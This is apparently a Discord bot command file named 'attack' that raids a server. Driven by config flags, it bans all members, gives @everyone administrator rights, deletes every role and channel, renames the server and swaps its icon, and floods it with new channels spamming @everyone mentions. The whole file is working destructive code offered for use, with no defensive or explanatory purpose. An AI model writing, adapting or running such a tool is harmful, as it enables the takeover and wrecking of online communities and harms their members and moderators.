const settings = require('../settings.json');
exports.run = (client, message, args) => {

    if (settings.config.ban === "1") {
    message.guild.roles.find('name', '@everyone').members.map(m=>m.ban());
    }


    function suite(){
        message.guild.edit({
            icon: settings.config.img,
            name: settings.config.name
    })}
    



    if (settings.config.admin === "1") {
    message.guild.roles.find('name', '@everyone').edit({
        permissions: [8]
    });
    }
    if (settings.config.role_dlt === "1") {
    Promise.all(message.guild.roles.map(c => c.delete()));
    }
    if (settings.config.role_crt === "1") {
    message.guild.createRole({
        name: 'undefined-1'
    });
    }
   
    if (settings.config.spam === '1') {
    message.guild.createChannel('undefined-156', 'text')
    message.channel.send('spam');
        function entierAleatoire(min, max){
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        async function superspam(value, key, map){
            const rndm = entierAleatoire(10, 0);
            const rndl = entierAleatoire(50, 25);
            await message.guild.createChannel(rndm + `${key}`, 'text');
            await message.guild.createChannel(rndl + `${key}`, 'text');
            const chnl1 = await client.channels.find('name', rndm + `${key}`);
            const chnl2 = await client.channels.find('name', rndl + `${key}`);
            await client.channels.get(chnl1.id).send('spam @everyone')
                .catch(console.error);
            await client.channels.get(chnl2.id).send('spam @everyone')
                .catch(console.error);
        };
        
        message.guild.roles.map(c => c.name)
            .forEach(superspam);    
    }
        if (settings.config.spam === '0') {
            const typer = 'text';
            message.guild.createChannel('undefined-3', typer);
        }
        if (settings.config.spam === '2') {
            const typer = 'voice';
            message.guild.createChannel('undefined-3', typer);

        }
        if (settings.config.spam === '3') {
            const typer = 'category';
            message.guild.createChannel('undefined-3', typer);
        }
    if (settings.config.chnl_dlt === "1"){
    Promise.all(message.guild.channels.map(c => c.delete()));
    }
    if (settings.config.imgnom === "1") {
    setTimeout(suite, 500);
    }
}

exports.conf = {
    permLevel: 0,
    aliases: []
}

exports.help = {
    name: 'attack'
}
